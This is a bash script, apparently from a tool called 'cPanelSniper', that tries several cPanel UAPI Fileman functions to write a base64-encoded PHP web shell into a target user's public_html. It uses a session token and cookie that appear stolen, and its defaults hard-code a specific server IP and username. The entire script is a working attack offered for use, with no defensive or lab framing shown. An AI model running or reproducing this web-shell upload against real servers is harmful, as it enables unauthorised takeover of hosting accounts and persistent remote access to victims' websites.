#!/bin/bash
# Try different UAPI Fileman functions
# Usage: ./test_uapi_functions.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE> <TARGET_USER>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess2231081202}"
COOKIE="${3:-%3ARpRCEB84DQNWOqju}"
TARGET_USER="${4:-wagamacy}"

echo "========================================"
echo "  Testing UAPI Fileman Functions"
echo "========================================"
echo ""

# Load shell
SHELL_FILE="/root/cPanelSniper/shell.php"
SHELL_B64=$(base64 -w 0 "$SHELL_FILE")

# Test 1: save_file_content
echo "[1] Testing Fileman::save_file_content..."
RESULT=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/execute/Fileman/save_file_content" \
  -H "Authorization: cpanel ${TARGET_USER}:${COOKIE}" \
  -H "Content-Type: application/json" \
  -d "{\"path\": \"/home/${TARGET_USER}/public_html/shell.php\", \"content\": \"${SHELL_B64}\", \"encoding\": \"base64\"}" 2>/dev/null)
if echo "$RESULT" | grep -q "success\|true\|OK\|error"; then
    echo "✅ Got response:"
    echo "$RESULT" | python3 -m json.tool 2>/dev/null || echo "$RESULT"
else
    echo "⚠️  Empty/invalid response"
fi
echo ""

# Test 2: upload_files (this one usually needs multipart, but let's try)
echo "[2] Testing Fileman::upload_files..."
RESULT=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/execute/Fileman/upload_files" \
  -H "Authorization: cpanel ${TARGET_USER}:${COOKIE}" \
  -H "Content-Type: application/json" \
  -d "{\"file\": \"shell.php\", \"content\": \"${SHELL_B64}\", \"destination\": \"/public_html\"}" 2>/dev/null)
if echo "$RESULT" | grep -q "success\|true\|error\|result"; then
    echo "✅ Got response:"
    echo "$RESULT" | python3 -m json.tool 2>/dev/null || echo "$RESULT"
else
    echo "⚠️  Empty/invalid response"
fi
echo ""

# Test 3: create_file
echo "[3] Testing Fileman::create_file..."
RESULT=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/execute/Fileman/create_file" \
  -H "Authorization: cpanel ${TARGET_USER}:${COOKIE}" \
  -H "Content-Type: application/json" \
  -d "{\"path\": \"/home/${TARGET_USER}/public_html/shell.php\", \"type\": \"file\"}" 2>/dev/null)
if echo "$RESULT" | grep -q "success\|true\|error\|result"; then
    echo "✅ Got response:"
    echo "$RESULT" | python3 -m json.tool 2>/dev/null || echo "$RESULT"
else
    echo "⚠️  Empty/invalid response"
fi
echo ""

# Test 4: Using list_files to understand structure
echo "[4] Getting file list structure..."
RESULT=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/execute/Fileman/list_files" \
  -H "Authorization: cpanel ${TARGET_USER}:${COOKIE}" \
  -H "Content-Type: application/json" \
  -d '{"path": "/public_html"}' 2>/dev/null)
echo "Response:"
echo "$RESULT" | python3 -m json.tool 2>/dev/null
echo ""

echo "========================================"
